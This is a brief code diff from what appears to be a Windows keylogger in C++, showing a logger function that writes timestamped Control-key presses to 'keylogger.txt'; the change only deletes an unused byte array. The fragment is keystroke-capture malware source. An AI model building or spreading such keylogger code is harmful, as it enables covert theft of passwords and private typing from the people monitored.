@@ -25,7 +25,6 @@ void logger() {
 	std::ofstream arq;
 	arq.open("keylogger.txt", std::ios::out | std::ios::app);
 
-	BYTE c[256];
 	if (GetAsyncKeyState(VK_CONTROL)) {
 		Sleep(TIME_);
 		arq << "(" << getLocalTime() << ") " << ": [CONTROL]\n";
